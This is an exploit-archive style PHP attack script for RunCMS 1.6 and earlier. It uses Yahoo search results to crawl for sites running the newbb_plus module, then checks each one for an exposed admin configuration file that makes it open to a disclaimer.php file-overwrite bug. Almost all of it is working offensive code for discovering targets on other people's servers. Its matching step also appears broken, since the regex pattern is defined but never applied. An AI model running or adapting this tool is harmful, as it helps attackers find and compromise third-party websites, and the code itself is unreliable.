RunCMS <= 1.6 disclaimer.php Remote File Overwrite Exploit
==========================================================




<?php
#######################################################################################
#
#      AmnPardaz Security Research & Penetration Testing Group
#
# Title: RunCms`s Bug Yahoo! Crawler
# Vendor: http://www.runcms.org/
# Vulnerable Version: RunCMS 1.6 Halloween, 1.5.x (prior versions also may be affected)
# Exploitation: Remote with browser
# Coded By: trueend5 (trueend5 yahoo com)
#######################################################################################
# Leaders : Shahin Ramezany & Sorush Dalili
# Team Members: Alireza Hasani ,Amir Hossein Khonakdar, Hamid Farhadi
# Country: Iran
######################## Bug Description ###########################
?>

<html dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>RunCms`s Bug Yahoo! Crawler</title>
<style type="text/css" media="screen">
body {
	font-size: 10px;
	font-family: verdana;
}
INPUT {
	BORDER-TOP-WIDTH: 1px; FONT-WEIGHT: bold; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 10px; BORDER-LEFT-COLOR: #D50428; BACKGROUND: #590009; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #D50428; COLOR: #00ff00; BORDER-TOP-COLOR: #D50428; FONT-FAMILY: verdana; BORDER-RIGHT-WIDTH: 1px; BORDER-RIGHT-COLOR: #D50428
}
</style>
</head>
<body dir="ltr" alink="#00ff00"  bgcolor="#000000" link="#00c000" text="#008000" vlink="#00c000">
<form action="?" method="post">
Run the Exploit And Use the results of "Yahoo! Search Engine" starting From the page:
<input type="text" name="StartPage" value="1" size="3">
including
<input type="text" name="PerPage" value="100" size="3">
results per page.<BR><BR>
<input type="submit" name="Start" value="Start">
</form>
<?php

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);


function sendpacket($packet)
{
	global $host, $html;
	$port  = 80;
		
	$ock=fsockopen(gethostbyname($host),$port);
    if ($ock)
	{
		fputs($ock,$packet);
		$html=&#039;&#039;;
		while (!feof($ock))
		{
			$html.=fgets($ock);
		}
		fclose($ock);
		// echo nl2br(htmlentities($html));
    }else echo &#039;<BR>No response from &#039;.htmlentities($host).&#039;<BR>&#039;;
}

	// Start
	if(isset($_POST[&#039;Start&#039;] ,$_POST[&#039;StartPage&#039;] ,$_POST[&#039;PerPage&#039;]))
	{
		$StartPage = ((intval($_POST[&#039;StartPage&#039;])) > 0) ? intval($_POST[&#039;StartPage&#039;]) : 1;
		$PerPage   = ((intval($_POST[&#039;PerPage&#039;])) <= 100) ? intval($_POST[&#039;PerPage&#039;]) : 100;
		if (($StartPage*$PerPage) > 1000)
		{
			echo "Yahoo! Search doesn&#039;t show More than 1000 Results per query"."<BR>";
			die();
		}
		echo &#039;Trying to obtain URLs Which are suspected to "newbb_plus disclaimer.php
		 File Overwrite" ...&#039;.&#039;<BR>&#039;;
		
		$Yahoo     = "search.yahoo.com";
		$S         = $StartPage;
		$P         = $PerPage;
		
		for ($S; $S*$P < 1000; $S++)
		{
			$host    = $Yahoo;
			$B       = ($S == 1) ? &#039;&#039; : &#039;&b=&#039;.((($S-1)*$P)+1);
			$Query   = "/search?p=runcms+inurl%3A%22%2Fmodules%2Fnews%2F%22&n=$P&ei=utf-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=url&vd=all&vst=0&vf=all&vm=p&fl=0&xargs=0&pstart=1".$B;
			
			$packet  = "GET ".$Query." HTTP/1.1\r\n";
			$packet .= "User-Agent: Shareaza v1.x.x.xx\r\n";
			$packet .= "Host: ".$host."\r\n";
			$packet .= "Connection: Close\r\n\r\n";
			sendpacket($packet);
			if(stristr($html , &#039;403 Forbidden&#039;) === false 
			&& stristr($html , &#039;302 Moved&#039;) === false)
			{
				echo &#039;<HR><BR><CENTER>Obtained URLs From Page:&#039;.($S).&#039;<CENTER><BR>&#039;;
				$Pattern = &#039;/href="http:\/\/?([^\/]+)?(\/[a-zA-Z]+)?(\/modules\/news\/)/i&#039;;
				$TotalLinks = count($Matches[1]);
				echo "In Progress<BR>";
				for ($I=0; $I < $TotalLinks; $I++)
				{
					echo ".";
					if ($Matches[2][$I] == &#039;&#039;)
					{
						$Path = "/modules/newbb_plus/admin/forum_config.php";
					}else 
					$Path    = $Matches[2][$I]."/modules/newbb_plus/admin/forum_config.php";
					$host    = $Matches[1][$I];
					$packet  = "GET ".$Path." HTTP/1.1\r\n";
					$packet .= "User-Agent: Shareaza v1.x.x.xx\r\n";
					$packet .= "Host: ".$host."\r\n";
					$packet .= "Connection: Close\r\n\r\n";
					sendpacket($packet);
					if(stristr($html , &#039;_MD_A_CONFIGFORUM&#039;) !== false)
					{
						echo "<BR><A href=&#039;http://".$host.$Path."&#039;>".$host.$Path."</A><BR>";
					}					
				}
			}else 
			{
				echo &#039;<BR>&#039;.&#039;Yahoo! finds out that this in an automated request
				 from a malware! So try again after awhile!&#039;;
				die();
			}
		}
	}
?>
</body>
</html>



